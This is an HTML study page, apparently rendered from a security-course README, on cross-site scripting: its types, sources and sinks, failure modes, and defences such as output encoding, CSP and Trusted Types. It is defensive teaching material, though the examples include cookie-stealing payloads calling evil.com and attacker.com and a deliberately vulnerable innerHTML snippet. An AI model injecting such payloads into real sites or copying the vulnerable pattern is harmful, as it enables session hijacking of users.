@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS — Cross-Site Scripting</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: web\Client-Side-Attacks\XSS\README.md</p>
+<h1 id="xss-cross-site-scripting">XSS — Cross-Site Scripting</h1>
+<p><strong>Category:</strong> Client-Side Attacks — Injection<br />
+<strong>OWASP:</strong> A03:2021 — Injection<br />
+<strong>CWE:</strong> CWE-79<br />
+<strong>Applies To:</strong> All web applications that render user-controlled data in HTML, JS, or URL contexts</p>
+<h2 id="overview">Overview</h2>
+<p>Cross-Site Scripting is a code injection attack where an attacker injects malicious JavaScript (or other executable code) into a web page that is then served to and executed by other users' browsers. The injected script runs in the context of the victim's session, inheriting their cookies, credentials, DOM access, and same-origin privileges. XSS is consistently in the OWASP Top 10 and is one of the most common, most impactful, and most frequently exploited vulnerability classes in web applications.</p>
+<p>At Google Chrome scale, XSS in a first-party property (gmail.com, accounts.google.com) could affect hundreds of millions of users. A single XSS vector in an authentication page can steal session cookies for all users who hit the page. Chrome's XSS Auditor was deprecated because server-side output encoding and Content Security Policy are the correct defenses; browser-side XSS filtering cannot reliably distinguish attack from benign content.</p>
+<p>XSS is divided into three types based on how the malicious payload is delivered and persisted.</p>
+<h2 id="how-it-works">How It Works</h2>
+<h3 id="type-1-reflected-xss">Type 1: Reflected XSS</h3>
+<p>The payload is embedded in the URL or request parameter, reflected back in the HTTP response, and executed in the victim's browser. The attacker sends the victim a crafted URL.</p>
+<p><strong>Example:</strong></p>
+<p>URL: <code>https://search.example.com/?q=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code></p>
+<p>If the server renders <code>q</code> directly into the HTML without encoding:</p>
+<pre><code class="language-html">&lt;p&gt;
+  Search results for:
+  &lt;script&gt;
+    document.location = &quot;https://evil.com/?c=&quot; + document.cookie;
+  &lt;/script&gt;
+&lt;/p&gt;
+</code></pre>
+<p>The victim's browser executes the script in the context of <code>search.example.com</code>.</p>
+<pre class="mermaid">
+sequenceDiagram
+    participant Attacker as Attacker
+    participant Victim as Victim User
+    participant App as search.example.com
+    participant C2 as evil.com
+
+    Attacker->>Victim: Send phishing link with XSS payload in URL
+    Victim->>App: GET /search?q=<script>...</script>
+    App-->>Victim: HTML response with unencoded payload reflected
+    Victim->>Victim: Browser executes injected script
+    Victim->>C2: Exfiltrates session cookie
+    C2->>Attacker: Attacker receives stolen cookie
+    Attacker->>App: Replay cookie to access victim account
+</pre>
+<h3 id="type-2-stored-persistent-xss">Type 2: Stored (Persistent) XSS</h3>
+<p>The payload is stored in the server's database and served to every user who views the content. More dangerous because it does not require social engineering each victim.</p>
+<p><strong>Example:</strong> An attacker posts a forum comment:</p>
+<pre><code>Great post! &lt;img src=&quot;x&quot; onerror=&quot;fetch('https://evil.com/?c='+btoa(document.cookie))&quot;&gt;
+</code></pre>
+<p>Every user who views the comment page has their cookies exfiltrated.</p>
+<pre class="mermaid">
+flowchart TD
+    A[Attacker submits content with XSS payload] --> B[Server stores payload in database without sanitization]
+    B --> C[Victim loads page containing stored payload]
+    C --> D[Browser renders payload as executable code]
+    D --> E[Script executes in victim browser context]
+    E --> F[Cookie theft, session hijacking, or further attack]
+</pre>
+<h3 id="type-3-dom-based-client-side-xss">Type 3: DOM-Based (Client-Side) XSS</h3>
+<p>The payload is processed entirely in the browser's DOM without being reflected from the server. JavaScript on the page reads attacker-controlled data from the URL fragment (<code>#hash</code>), URL parameters via <code>location.search</code>, <code>document.referrer</code>, etc., and writes it into the DOM using dangerous sinks.</p>
+<p><strong>Example:</strong></p>
+<pre><code class="language-javascript">// Vulnerable code
+const name = new URLSearchParams(location.search).get(&quot;name&quot;);
+document.getElementById(&quot;greeting&quot;).innerHTML = &quot;Hello, &quot; + name; // SINK: innerHTML
+</code></pre>
+<p>URL: <code>https://app.example.com/welcome?name=&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p>The server never sees or reflects the payload. The vulnerability is entirely in the client-side JavaScript.</p>
+<p><strong>Common DOM XSS Sources (attacker-controlled input):</strong></p>
+<ul>
+<li><code>document.URL</code>, <code>document.location</code></li>
+<li><code>location.href</code>, <code>location.search</code>, <code>location.hash</code></li>
+<li><code>document.referrer</code></li>
+<li><code>window.name</code></li>
+<li><code>postMessage</code> event data</li>
+</ul>
+<p><strong>Common DOM XSS Sinks (dangerous output methods):</strong></p>
+<ul>
+<li><code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code></li>
+<li><code>document.write()</code>, <code>document.writeln()</code></li>
+<li><code>eval()</code>, <code>setTimeout(string)</code>, <code>setInterval(string)</code>, <code>Function()</code></li>
+<li><code>src</code> attribute on script tags</li>
+<li><code>location.href =</code>, <code>location.assign()</code> (can cause <code>javascript:</code> URI execution)</li>
+</ul>
+<pre class="mermaid">
+flowchart TD
+    A[URL contains XSS payload in hash or query param] --> B[Page JavaScript reads URL data]
+    B --> C{Written to dangerous sink?}
+    C -- innerHTML/document.write/eval --> D[Script or HTML injected into DOM]
+    D --> E[Browser executes in page origin context]
+    C -- Safe encoding function used --> F[Rendered as text, not code]
+</pre>
+<h3 id="xss-payload-capabilities">XSS Payload Capabilities</h3>
+<p>A successful XSS script running in the victim's browser can:</p>
+<ul>
+<li>Steal session cookies (if not <code>HttpOnly</code>)</li>
+<li>Read and exfiltrate page content (forms, tokens, data)</li>
+<li>Perform actions as the victim (change password, place orders, transfer funds)</li>
+<li>Inject phishing content into the legitimate page</li>
+<li>Exploit <code>postMessage</code> APIs to bridge to other origins</li>
+<li>Capture keystrokes including passwords as the user types</li>
+<li>Access browser extensions' message APIs</li>
+<li>Spread to other users (worm via stored XSS)</li>
+<li>Use the browser as a botnet node (BeEF hook)</li>
+</ul>
+<h3 id="the-img-cross-origin-request-vector">The <code>&lt;img&gt;</code> Cross-Origin Request Vector</h3>
+<pre><code class="language-html">&lt;img src=&quot;https://attacker.com/collect?data=EXFIL&quot; /&gt;
+</code></pre>
+<p>Images are loaded cross-origin without CORS restrictions. An injected <code>&lt;img&gt;</code> tag can:</p>
+<ul>
+<li>Exfiltrate data by encoding it in the URL query string</li>
+<li>Trigger a cross-origin GET request to an attacker's server</li>
+<li>Perform CSRF-like side effects on servers that process GET requests with state changes (GET-based state changes are an anti-pattern but common in legacy systems)</li>
+<li>Not be blocked by <code>HttpOnly</code> cookie isolation (it uses the img tag, not XHR)</li>
+</ul>
+<h2 id="what-can-go-wrong">What Can Go Wrong</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Failure / Attack</th>
+<th>Root Cause</th>
+<th>Impact</th>
+<th>Likelihood</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Reflected XSS</td>
+<td>User input echoed in HTML without encoding</td>
+<td>Cookie theft, session hijacking, phishing</td>
+<td>High</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Stored XSS</td>
+<td>User content stored and displayed without sanitization</td>
+<td>Mass account compromise (all viewers affected)</td>
+<td>High</td>
+</tr>
+<tr>
+<td>3</td>
+<td>DOM XSS</td>
+<td>Client JS uses URL data in unsafe sinks</td>
+<td>Same as above; harder to detect in static scans</td>
+<td>High</td>
+</tr>
+<tr>
+<td>4</td>
+<td>XSS on auth pages</td>
+<td>Session cookies stolen from login/password pages</td>
+<td>Account takeover</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>5</td>
+<td>XSS in JSON responses returned as HTML</td>
+<td>API JSON response has wrong Content-Type</td>
+<td>JSON data parsed as HTML and executed</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>6</td>
+<td>XSS via SVG or other rich media uploads</td>
+<td>Uploaded SVG files contain embedded scripts</td>
+<td>Script executes when SVG is viewed at file's URL</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>7</td>
+<td>XSS bypassing WAF</td>
+<td>Obfuscated or encoded payloads evade WAF rules</td>
+<td>Same as full XSS</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Mutation XSS (mXSS)</td>
+<td>Browser's HTML parser mutates server-sanitized HTML into script context</td>
+<td>Sanitizer output is made executable by parser</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>9</td>
+<td>XSS via HTTP response header injection</td>
+<td>User input injected into HTTP headers enables response body injection</td>
+<td>Script execution in victim context</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Dangling markup injection</td>
+<td>Partial HTML injection (no script tag) exfiltrates data via attribute or tag boundaries</td>
+<td>Data leakage cross-origin</td>
+<td>Med</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation-controls">Mitigation Controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Failure</th>
+<th>Mitigation</th>
+<th>Layer / Where Applied</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Reflected XSS</td>
+<td>Context-aware output encoding (HTML-encode in HTML context; JS-encode in script context; URL-encode in URL context)</td>
+<td>Server-side templates and rendering</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Stored XSS</td>
+<td>Sanitize on output, not just input; use a vetted HTML sanitization library (DOMPurify) for rich text</td>
+<td>Storage + rendering layer</td>
+</tr>
+<tr>
+<td>3</td>
+<td>DOM XSS</td>
+<td>Replace dangerous sinks (<code>innerHTML</code>) with safe alternatives (<code>textContent</code>); use trusted types API</td>
+<td>Client-side JS code review</td>
+</tr>
+<tr>
+<td>4</td>
+<td>XSS on auth pages</td>
+<td>HttpOnly cookies + strict CSP on auth pages + sub-resource integrity</td>
+<td>Cookie flags + CSP policy</td>
+</tr>
+<tr>
+<td>5</td>
+<td>JSON served as HTML</td>
+<td>Set <code>Content-Type: application/json</code> explicitly; never return user data in <code>text/html</code> responses</td>
+<td>API response headers</td>
+</tr>
+<tr>
+<td>6</td>
+<td>SVG upload XSS</td>
+<td>Serve user-uploaded files from a separate sandboxed domain (e.g., <code>usercontent.google.com</code>); strip script content from SVG</td>
+<td>Upload handling + origin isolation</td>
+</tr>
+<tr>
+<td>7</td>
+<td>WAF bypass</td>
+<td>WAF is not the primary XSS defense; use it as a secondary layer; fix the root cause (output encoding)</td>
+<td>Defense in depth</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Mutation XSS</td>
+<td>Use well-maintained sanitizer like DOMPurify which handles mXSS; test against known mXSS payloads</td>
+<td>Server + client sanitization</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Header injection</td>
+<td>Validate and reject newline characters in any user data used in response headers</td>
+<td>Input validation</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Dangling markup</td>
+<td>Strict CSP with <code>img-src 'self'</code> and <code>form-action 'self'</code> limits exfiltration paths</td>
+<td>CSP header</td>
+</tr>
+</tbody>
+</table>
+<h3 id="content-security-policy-for-xss-defense">Content Security Policy For XSS Defense</h3>
+<p>CSP is the most powerful defense-in-depth control against XSS. A strict CSP prevents injected scripts from executing even if XSS is present:</p>
+<pre><code>Content-Security-Policy: default-src 'self';
+  script-src 'self' 'nonce-RANDOM_NONCE';
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+  img-src 'self' data:;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>CSP Directive</th>
+<th>XSS Defense</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>script-src 'nonce-RANDOM'</code></td>
+<td>Inline scripts without matching nonce are blocked</td>
+</tr>
+<tr>
+<td><code>script-src 'strict-dynamic'</code></td>
+<td>Trusted scripts can load others; eliminates long allowlists</td>
+</tr>
+<tr>
+<td><code>object-src 'none'</code></td>
+<td>Blocks Flash and other plugin-based execution</td>
+</tr>
+<tr>
+<td><code>base-uri 'self'</code></td>
+<td>Prevents <code>&lt;base&gt;</code> tag injection from changing relative URLs</td>
+</tr>
+<tr>
+<td><code>form-action 'self'</code></td>
+<td>Blocks form data exfiltration to attacker origins</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Trusted Types API:</strong> Chrome-only API that forces all DOM sink assignments through validated transformers, making DOM XSS nearly impossible if deployed correctly.</p>
+<h3 id="top-3-critical-mitigations">Top 3 Critical Mitigations</h3>
+<ol>
+<li><strong>Context-aware output encoding everywhere.</strong> The root cause of every XSS is content being interpreted as code instead of data. HTML-encode user input in HTML context, JavaScript-encode in script context, URL-encode in URL context, and CSS-encode in style context. Never use a single "strip bad chars" approach — encoding must match the rendering context.</li>
+<li><strong>Deploy Content Security Policy with nonce-based script allowlisting.</strong> Even if output encoding fails, a strict CSP with <code>script-src 'nonce-RANDOM'</code> prevents the injected script from executing. Use CSP in report-only mode first to detect violations without breaking functionality, then enforce. This is defense in depth but critical for high-security pages like login and payment flows.</li>
+<li><strong>Treat DOM XSS as a first-class code review issue.</strong> DOM XSS is invisible to server-side scans and commonly missed. Audit all uses of <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, and <code>location.href =</code>. Replace with safe alternatives: <code>textContent</code> instead of <code>innerHTML</code>, <code>JSON.parse</code> instead of <code>eval</code>. Enforce via Trusted Types and static analysis tooling in CI/CD.</li>
+</ol>
+<h2 id="practice-questions">Practice Questions</h2>
+<ol>
+<li>What are the three types of XSS? How do they differ in delivery mechanism and persistence?</li>
+<li>How does <code>HttpOnly</code> cookie protection limit XSS impact? What can an attacker still do with an <code>HttpOnly</code> session cookie via XSS?</li>
+<li>What is DOM-based XSS? Name three common sources and three common sinks.</li>
+<li>How does Content Security Policy prevent XSS? What is the difference between a nonce-based CSP and an allowlist-based CSP?</li>
+<li>What is mutation XSS (mXSS)? Why is string-level sanitization insufficient and why does DOMPurify use DOM-based parsing?</li>
+<li>Why is serving user-uploaded files (images, SVGs) from the same origin as the app a security risk?</li>
+<li>An API endpoint returns user-provided data with <code>Content-Type: text/html</code>. What XSS risk does this create?</li>
+<li>What are Trusted Types and how do they prevent DOM XSS even when other defenses fail?</li>
+<li>A WAF blocks <code>&lt;script&gt;</code> tags in input. Name three XSS payload techniques that bypass this pattern.</li>
+<li>How would you audit a large codebase (millions of lines) for DOM XSS sinks at Google scale?</li>
+</ol>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>XSS is content-as-code injection: attacker data is interpreted as executable scripts in the victim's browser.</li>
+<li>Reflected = URL-based, one-victim; Stored = database-persisted, mass-victim; DOM = client-side only, server-blind.</li>
+<li>The root cause is always insufficient output encoding for the rendering context.</li>
+<li><code>HttpOnly</code> limits cookie theft but does not stop authenticated actions, page content theft, or keyboard capture.</li>
+<li>CSP with nonces is the most powerful defense-in-depth control; Trusted Types extends this to DOM operations.</li>
+<li>An <code>&lt;img&gt;</code> tag is a cross-origin HTTP request — injected HTML does not need <code>&lt;script&gt;</code> to exfiltrate data.</li>
+<li>Stored XSS is the highest-impact variant: one exploit affects every user who views the infected page, forever, until remediated.</li>
+</ul>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
